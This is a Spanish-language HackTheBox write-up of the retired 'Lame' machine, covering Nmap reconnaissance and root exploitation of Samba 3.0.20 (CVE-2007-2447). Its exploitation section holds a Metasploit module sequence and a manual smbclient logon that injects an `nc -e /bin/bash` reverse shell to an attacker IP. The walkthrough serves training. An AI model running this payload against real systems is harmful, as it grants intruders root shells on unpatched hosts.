---
title: "Lame - HackTheBox"
description: "Writeup de la máquina Lame de HackTheBox, una máquina Linux fácil perfecta para principiantes."
pubDate: 2024-10-10
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
lang: es
tags: ["samba", "vsftpd", "metasploit", "exploit", "CVE-2007-2447"]
retired: true
logo: "/images/writeups/htb/lame/logo.png"
heroImage: "/images/writeups/htb/lame/logo.png"
attackVectors: ["network", "web"]
techniques: ["T1190", "T1068", "T1059"]
vulnerabilities: ["CVE-2007-2447"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "30-45 minutos"
points: 20
rating: 4
---

# Lame - HackTheBox Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackTheBox

## Reconocimiento

Iniciamos con un escaneo de Nmap:

```bash
nmap -sC -sV -oA lame 10.10.10.3
```

**Puertos abiertos:**
- 21/tcp (FTP - vsftpd 2.3.4)
- 22/tcp (SSH - OpenSSH 4.7p1)
- 139/tcp (Netbios-ssn - Samba 3.0.20)
- 445/tcp (Netbios-ssn - Samba 3.0.20)

## Enumeración

### FTP - vsftpd 2.3.4

Esta versión tiene una vulnerabilidad de backdoor conocida, pero no funcionó en este caso.

### Samba 3.0.20

Samba 3.0.20 es vulnerable a **CVE-2007-2447** (username map script).

## Explotación

### Exploit con Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
exploit
```

### Exploit Manual

También podemos explotar manualmente:

```bash
smbclient //10.10.10.3/tmp
logon "./=`nohup nc -e /bin/bash 10.10.14.5 4444`"
```

En otra terminal escuchamos:

```bash
nc -lvnp 4444
```

## Post-Explotación

Obtenemos shell como **root** directamente.

**User flag:**
```bash
cat /home/makis/user.txt
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusión

Lame es una excelente máquina para principiantes que demuestra la importancia de mantener software actualizado. La vulnerabilidad de Samba es un clásico que todo pentester debe conocer.

**Lecciones aprendidas:**
- Siempre verificar versiones de software
- Samba 3.0.20 tiene una vulnerabilidad crítica
- La enumeración exhaustiva es clave
